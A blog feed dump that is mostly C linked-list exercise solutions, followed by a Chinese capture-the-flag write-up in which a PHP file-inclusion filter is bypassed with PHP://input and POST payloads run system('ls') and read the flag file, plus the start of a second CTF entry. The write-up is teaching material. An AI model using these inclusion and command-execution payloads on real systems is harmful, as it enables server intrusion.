&amp;lc,list &amp;la,list &amp;lb )</span><br><span class="line"> &#123;</span><br><span class="line">   list  pa,pb,pc;</span><br><span class="line"> pa=la-&gt;next;</span><br><span class="line"> pb=lb-&gt;next;</span><br><span class="line"> lc=pc=la;</span><br><span class="line"> while(pa&amp;&amp;pb)</span><br><span class="line"> &#123;</span><br><span class="line"> if(pa-&gt;data&lt;=pb-&gt;data)</span><br><span class="line"> &#123;</span><br><span class="line"> pc-&gt;next=pa;pc=pa;pa=pa-&gt;next;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line"> pc-&gt;next=pb;pc=pb;pb=pb-&gt;next;</span><br><span class="line"> &#125;</span><br><span class="line">  &#125; </span><br><span class="line"> if(pa)pc-&gt;next=pa;</span><br><span class="line"> else pc-&gt;next=pb;</span><br><span class="line">  free(lb);</span><br><span class="line"> &#125;</span><br><span class="line"> int main()</span><br><span class="line"> &#123;</span><br><span class="line"> list la,lb,lc;</span><br><span class="line"> int n,m;</span><br><span class="line"> printf(&quot;请输入la的链长:\n&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line"> printf(&quot;请有序输入la链中节点值:\n&quot;);</span><br><span class="line"> creatlist(la,n);</span><br><span class="line"> printf(&quot;请输入lb的链长:\n&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;,&amp;m);</span><br><span class="line"> printf(&quot;请有序输入lb链中节点值:\n&quot;);</span><br><span class="line"> creatlist(lb,m);</span><br><span class="line"> mergelist(lc,la,lb);</span><br><span class="line"> printf(&quot;有序输出lc:\n&quot;);</span><br><span class="line"> output(lc);</span><br><span class="line"> return 0;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">21、设计一个算法，以先进先出的方式创建一个带头结点的</span><br><span class="line">单向链表，并输出 。</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">typedef int status;</span><br><span class="line">typedef int elemtype;</span><br><span class="line"></span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line"> elemtype data;</span><br><span class="line"> struct node *next;</span><br><span class="line">&#125;Lnode,*linklist;</span><br><span class="line"></span><br><span class="line">void creatfifo(linklist &amp;L,int n)</span><br><span class="line">&#123;</span><br><span class="line"> int i;</span><br><span class="line"> linklist s,r;</span><br><span class="line"> L=(linklist)malloc(sizeof(Lnode));</span><br><span class="line"> L-&gt;next=NULL;r=L;</span><br><span class="line"></span><br><span class="line"> printf(&quot;请输入链表的%d个值:\n&quot;,n);</span><br><span class="line"> for(i=1;i&lt;=n;i++)</span><br><span class="line"> &#123;</span><br><span class="line">  s=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">  scanf(&quot;%d&quot;,&amp;s-&gt;data);</span><br><span class="line">  r-&gt;next=s;</span><br><span class="line">  r=s;</span><br><span class="line"> &#125;</span><br><span class="line"> r-&gt;next=NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print(linklist L)</span><br><span class="line">&#123;</span><br><span class="line"> linklist p;</span><br><span class="line"> p=L-&gt;next;</span><br><span class="line"> printf(&quot;输出链表的值为:\n&quot;);</span><br><span class="line"> while(p)</span><br><span class="line"> &#123;</span><br><span class="line">  printf(&quot;%d &quot;,p-&gt;data);</span><br><span class="line">  p=p-&gt;next;</span><br><span class="line"> &#125;</span><br><span class="line"> printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> linklist L;</span><br><span class="line"> int n;</span><br><span class="line"></span><br><span class="line"> printf(&quot;请输入n的值:\n&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line"> creatfifo(L,n);</span><br><span class="line"> print(L);</span><br><span class="line"></span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">22、设计一个算法，以后进先出的方式创建一个带头结点的单向链表，并输出 。</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">typedef int status;</span><br><span class="line">typedef int elemtype;</span><br><span class="line"></span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">elemtype data;</span><br><span class="line">struct node *next;</span><br><span class="line">&#125;Lnode,*linklist;</span><br><span class="line"></span><br><span class="line">void creatfifo1(linklist &amp;L,int n)</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">linklist s;</span><br><span class="line">L=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">L-&gt;next=NULL;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表的%d个值:\n&quot;,n);</span><br><span class="line">for(i=n;i&gt;0;--i)</span><br><span class="line">&#123;</span><br><span class="line">s=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">scanf(&quot;%d&quot;,&amp;s-&gt;data);</span><br><span class="line">s-&gt;next=L-&gt;next;</span><br><span class="line">L-&gt;next=s;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print(linklist L)</span><br><span class="line">&#123;</span><br><span class="line">linklist p;</span><br><span class="line">p=L-&gt;next;</span><br><span class="line">printf(&quot;输出链表的值为:\n&quot;);</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d &quot;,p-&gt;data);</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist L;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入n的值:\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">creatfifo1(L,n);</span><br><span class="line">print(L);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">23、设计一个算法，以先进先出的方式创建一个带头结点的双向链表，并输出。</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">typedef int elemtype;</span><br><span class="line"></span><br><span class="line">typedef struct dulnode</span><br><span class="line">&#123;</span><br><span class="line">elemtype data;</span><br><span class="line">struct dulnode *prior;</span><br><span class="line">struct dulnode *next;</span><br><span class="line">&#125;dulnode,*dullinklist;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void creat(dullinklist&amp; L, int n)</span><br><span class="line">&#123;</span><br><span class="line">dullinklist q;</span><br><span class="line">dullinklist p;</span><br><span class="line">L=(dullinklist)malloc(sizeof(dulnode));</span><br><span class="line">p=L;</span><br><span class="line">while(n--)</span><br><span class="line">&#123;</span><br><span class="line">q=(dullinklist)malloc(sizeof(dulnode));</span><br><span class="line">scanf(&quot;%d&quot;,&amp;q-&gt;data);</span><br><span class="line">p-&gt;next=q;</span><br><span class="line">q-&gt;prior=p;</span><br><span class="line">p=q;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;next=NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print(dullinklist L)</span><br><span class="line">&#123;</span><br><span class="line">L=L-&gt;next;</span><br><span class="line">while(L)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d&quot;,L-&gt;data);</span><br><span class="line">if (L-&gt;next != NULL)</span><br><span class="line">printf(&quot; &quot;);</span><br><span class="line">L=L-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">dullinklist L;</span><br><span class="line">int n;</span><br><span class="line">printf(&quot;请输入链表元素个数n:\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">printf(&quot;请输入%d个元素:\n&quot;,n);</span><br><span class="line">creat(L,n);</span><br><span class="line">printf(&quot;输出该双向链表为:\n&quot;);</span><br><span class="line">print(L);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">24、试编写算法创建一个带头结点的单向循环链表la=&#123;a1,a2,...an&#125;，并从指定</span><br><span class="line">的结点序号起输出循环链表。</span><br><span class="line">//试编写算法创建一个带头结点的单向循环链表la=&#123;a1,a2,...an&#125;</span><br><span class="line">//并从指定的结点序号起输出循环链表</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">typedef int elemtype;</span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">elemtype data;</span><br><span class="line">struct node *next;</span><br><span class="line">&#125;Lnode,*linklist;</span><br><span class="line"></span><br><span class="line">void creat(linklist&amp; L,int n)</span><br><span class="line">&#123;</span><br><span class="line">linklist q;</span><br><span class="line">linklist p;</span><br><span class="line">L=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">p=L;</span><br><span class="line">while(n--)</span><br><span class="line">&#123;</span><br><span class="line">q=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">scanf(&quot;%d&quot;,&amp;q-&gt;data);</span><br><span class="line">p-&gt;next=q;</span><br><span class="line">p=q;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;next=L-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print(linklist L,linklist t)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d &quot;,L-&gt;data);</span><br><span class="line">L=L-&gt;next;</span><br><span class="line">while(L!=t)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d&quot;,L-&gt;data);</span><br><span class="line">if(L-&gt;next!=t)</span><br><span class="line">printf(&quot; &quot;);</span><br><span class="line">L = L-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void idx(linklist&amp; L, int m)</span><br><span class="line">&#123;</span><br><span class="line">while(m--)</span><br><span class="line">&#123;</span><br><span class="line">L=L-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist L;</span><br><span class="line">int n,m;</span><br><span class="line">printf(&quot;请输入链表长度:\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入%d个元素:\n&quot;,n);creat(L, n);printf(&quot;请输入指定的结点序号（从此结点起输出循环链表）:\n&quot;);scanf(&quot;%d&quot;,&amp;m);idx(L, m);linklist t = L;print(L,t);printf(&quot;\n&quot;);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">25、已知带头结点的单链表la=&#123;a1,a2,...an&#125;，试编写一个算法将值重复的结点</span><br><span class="line">删除，使所得的结果表中的值均不相同。</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">#define M 100</span><br><span class="line"></span><br><span class="line">typedef int elemtype;</span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">elemtype e;</span><br><span class="line">node* next;</span><br><span class="line">node* form;</span><br><span class="line">&#125;Lnode,*linklist;</span><br><span class="line"></span><br><span class="line">void creat(linklist&amp; L,int n)</span><br><span class="line">&#123;</span><br><span class="line">linklist q;</span><br><span class="line">linklist p;</span><br><span class="line">L=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">p=L;</span><br><span class="line">while (n--)</span><br><span class="line">&#123;</span><br><span class="line">q=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">scanf(&quot;%d&quot;,&amp;q-&gt;e);</span><br><span class="line">p-&gt;next=q;</span><br><span class="line">q-&gt;form=p;</span><br><span class="line">p=q;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;next=NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print(linklist L)</span><br><span class="line">&#123;</span><br><span class="line">L=L-&gt;next;</span><br><span class="line">while (L)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d&quot;,L-&gt;e);</span><br><span class="line">if (L-&gt;next != NULL)</span><br><span class="line">printf(&quot; &quot;);</span><br><span class="line">L=L-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Delete(linklist&amp; L)</span><br><span class="line">&#123;</span><br><span class="line">int a[M];</span><br><span class="line">memset(a,0,sizeof(a));</span><br><span class="line">linklist l=L;</span><br><span class="line">while (l-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line">if(a[l-&gt;next-&gt;e]==0)</span><br><span class="line">a[l-&gt;next-&gt;e]++;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">l-&gt;next=l-&gt;next-&gt;next;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">l=l-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int n;</span><br><span class="line">linklist L;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表长度:\n&quot;);scanf(&quot;%d&quot;,&amp;n);printf(&quot;请输入%d个元素:\n&quot;,n);creat(L,n);Delete(L);printf(&quot;删除重复元素后为:\n&quot;);print(L);printf(&quot;\n&quot;);return 0; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">26、有一有序的单向链表（允许出现值相同的结点），试设计一个算法将值</span><br><span class="line">重复的结点删除，使所得的结果表中的值均不相同。</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">typedef int elemtype;</span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">elemtype e;</span><br><span class="line">node* next;</span><br><span class="line">node* form;</span><br><span class="line">&#125;Lnode,*linklist;</span><br><span class="line"></span><br><span class="line">void creat(linklist&amp; L,int n)</span><br><span class="line">&#123;</span><br><span class="line">linklist q;</span><br><span class="line">linklist p;</span><br><span class="line">L=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">p=L;</span><br><span class="line">while (n--)</span><br><span class="line">&#123;</span><br><span class="line">q=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">scanf(&quot;%d&quot;,&amp;q-&gt;e);</span><br><span class="line">p-&gt;next=q;</span><br><span class="line">q-&gt;form=p;</span><br><span class="line">p=q;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;next=NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print(linklist L)</span><br><span class="line">&#123;</span><br><span class="line">L=L-&gt;next;</span><br><span class="line">while (L)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d&quot;,L-&gt;e);</span><br><span class="line">if (L-&gt;next != NULL)</span><br><span class="line">printf(&quot; &quot;);</span><br><span class="line">L=L-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Delete(linklist&amp; L)</span><br><span class="line">&#123;</span><br><span class="line">linklist l=L;</span><br><span class="line">l=l-&gt;next;</span><br><span class="line">while(l)</span><br><span class="line">&#123;</span><br><span class="line">if (l-&gt;e == l-&gt;form-&gt;e)</span><br><span class="line">&#123;</span><br><span class="line">linklist t=l-&gt;form;</span><br><span class="line">if (l-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line">l-&gt;form-&gt;next=l-&gt;next;</span><br><span class="line">l-&gt;next-&gt;form=l-&gt;form;</span><br><span class="line">l=t;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">t-&gt;next=NULL;</span><br><span class="line">l=t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">l=l-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int n;</span><br><span class="line">linklist L;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表长度:\n&quot;);scanf(&quot;%d&quot;,&amp;n);printf(&quot;请输入%d个元素:\n&quot;,n);creat(L,n);Delete(L);printf(&quot;删除重复元素后为:\n&quot;);print(L);printf(&quot;\n&quot;);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">27已知一个带头结点的单链表lc中结点数据元素类型为字符型数据，主要包括二类字符（字母字符与数字字符），试设计一个算法，将lc拆分成二个链表la与lb，其中la的数据为字母字符，lb的数据为数字字符。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"># include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">char elem;</span><br><span class="line">struct Node* next;</span><br><span class="line">&#125;*linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">l = (linklist) malloc(sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">linklist p, end;</span><br><span class="line">end = l;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表元素(无需空格隔开)：\n&quot;);</span><br><span class="line">for(int i = 0; i&lt;n; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = (linklist) malloc (sizeof(Node));</span><br><span class="line">scanf(&quot;%c&quot;, &amp;p-&gt;elem);</span><br><span class="line">end-&gt;next = p;</span><br><span class="line">p-&gt;next = NULL;</span><br><span class="line">end = p;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表中的元素为:\n&quot;);</span><br><span class="line">linklist p;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c &quot;, p-&gt;elem);</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void splitlinklist(linklist &amp;l1, linklist &amp;l2, linklist &amp;l3)</span><br><span class="line">&#123;</span><br><span class="line">l2 = (linklist) malloc (sizeof(Node));</span><br><span class="line">l3 = (linklist) malloc (sizeof(Node));</span><br><span class="line">l2-&gt;next = NULL;</span><br><span class="line">l3-&gt;next = NULL;</span><br><span class="line">linklist q, p, s;</span><br><span class="line">p = l1-&gt;next;</span><br><span class="line">q = l2;</span><br><span class="line">s = l3;</span><br><span class="line"></span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">if(((p-&gt;elem) &gt;= &#x27;a&#x27; &amp;&amp; (p-&gt;elem) &lt;= &#x27;z&#x27;) || ((p-&gt;elem) &gt;= &#x27;A&#x27; &amp;&amp; (p-&gt;elem) &lt;= &#x27;Z&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">q-&gt;next = p;</span><br><span class="line">q = q-&gt;next;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">else if((p-&gt;elem) &gt;= &#x27;0&#x27; &amp;&amp; (p-&gt;elem) &lt;= &#x27;9&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">s-&gt;next = p;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">s = s-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">q-&gt;next = NULL;</span><br><span class="line">s-&gt;next = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist l1, l2, l3;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表的元素个数：\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;, &amp;n);</span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line">inlinklist(l1 ,n);</span><br><span class="line">splitlinklist(l1, l2, l3);</span><br><span class="line">outlinklist(l2);</span><br><span class="line">outlinklist(l3);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">28、设单链表的前二个结点值为均为１，从第三个结点开始，结点值为前二个</span><br><span class="line">结点值之和，试设计一个具有ｎ（２５＞ｎ＞＝３）个结点的单向链表，并输出。</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">typedef int elemtype;</span><br><span class="line"></span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">elemtype data;</span><br><span class="line">struct node *next;</span><br><span class="line">struct node *form;</span><br><span class="line">&#125;Lnode,*linklist;</span><br><span class="line"></span><br><span class="line">void creat(linklist &amp;L,int n)</span><br><span class="line">&#123;</span><br><span class="line">linklist q;</span><br><span class="line">linklist p;</span><br><span class="line">L=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">p=L;</span><br><span class="line">int i=0;</span><br><span class="line">while(n--)</span><br><span class="line">&#123;</span><br><span class="line">q=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">if(i++&lt;2)</span><br><span class="line">&#123;</span><br><span class="line">q-&gt;data=1;</span><br><span class="line">q-&gt;form=p;</span><br><span class="line">p-&gt;next=q;</span><br><span class="line">p=q;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">q-&gt;data=p-&gt;form-&gt;data+p-&gt;data;</span><br><span class="line">q-&gt;form=p;</span><br><span class="line">p-&gt;next=q;</span><br><span class="line">p=q;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;next=NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print(linklist L)</span><br><span class="line">&#123;</span><br><span class="line">linklist p;</span><br><span class="line">p=L-&gt;next;</span><br><span class="line">printf(&quot;输出链表的值为:\n&quot;);</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d &quot;,p-&gt;data);</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist L;</span><br><span class="line">int n;</span><br><span class="line">printf(&quot;请输入一个数n: (3&lt;=n&lt;25)\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">creat(L, n);</span><br><span class="line">print(L);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web_php_include(攻防世界)</title>
      <link href="/2021/11/11/Web_php_include(%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C)/"/>
      <url>/2021/11/11/Web_php_include(%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C)/</url>
      
        <content type="html"><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>打开链接是一串php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);  <span class="comment">//语法高亮，基本没利用点</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];    <span class="comment">//输出传参hello，因该是给我们用来判定是否传入数据成功</span></span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];   <span class="comment">//将get到的page值赋给$page</span></span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123; <span class="comment">//当我传入PHp://时函数是没有检测到，返回false那么循环语句里面的都不执行。</span></span><br><span class="line">    <span class="variable">$page</span>=str_replace(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>); <span class="comment">//执行包含$page文件，而page的内容我们可以通过post方式传入。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对上面的代码进行分析+看别的题解大概知道就是我们先get传入</p><blockquote><p>?page=php://input（利用php伪协议大小写绕过改成?page=PHP://input）</p></blockquote><p>然后就能以post方式传入我们想要执行的命令<br>传入post值：</p><blockquote><?php system("ls");?><p>得到<br><img src="https://img-blog.csdnimg.cn/a1b701842cb34edda756363651c7d132.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LW25LiN5LiK5pep6aWt,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>flag应该就在fl4gisisish3r3.php里面<br>接着我们将post值改成<br><?php system("cat fl4gisisish3r3.php");?><br>在源代码中可以找到flag<br><img src="https://img-blog.csdnimg.cn/25175a0d7a2c44d1b9d7d1a03c4d4349.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LW25LiN5LiK5pep6aWt,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p></blockquote><h2 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h2><p><strong>文件包含漏洞</strong><br>文件包含漏洞，就是说你使用文件包含函数后，会把你包含的文件也进行一遍编译或者叫做执行。    PHP中文件包含函数有以下四种：</p><blockquote><p>require()、require_once()、include()、include_once()</p></blockquote><p>其中include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；<br>require函数出现错误的时候，会直接报错并退出程序的执行。<br>include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次.<br><strong>php伪协议中的php://input</strong><br>一般的利用形式为file=php://input。php://input    可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行且php://input 也可以用来生成一句话木马。<br><strong>strstr函数的理解</strong><br>strstr(被搜索的字符串，搜索的字符串)  函数搜索字符串在另一字符串中是否存在，如果是返回该字符串及剩余部分，否则返回    FALSE。但是需要注意它是严格区分大小写的，也就是说可以利用PHp://input。 str_replace函数的理解      str_replace(str1,str2,str),将str字符串中的str1替换成str2注意：他是区分大小写的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2018]Fakebook</title>
      <link href="/2021/11/11/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook%EF%BC%88%E6%B3%A8%E5%85%A5%EF%BC%89/"/>
      <url>/2021/11/11/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook%EF%BC%88%E6%B3%A8%E5%85%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>人除我佬。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>进入网站，界面如下<br><img src="https://img-blog.csdnimg.cn/2021051720552260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先打开<strong>join</strong>看一下，注册页面，随便注册一下<br>注册成功后直接登录<br><img src="https://img-blog.csdnimg.cn/20210517205837581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>username</strong>下面可以点击进入<br><img src="https://img-blog.csdnimg.cn/20210517205934984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来就不会写了，按惯例看大佬的题解：<br>通过dirsearch爆破出网站存在一个**/flag.php**网页，但是无法正常读取。<br>访问robots协议，发现有源码备份文件。<br><img src="https://img-blog.csdnimg.cn/2021051721145011.png" 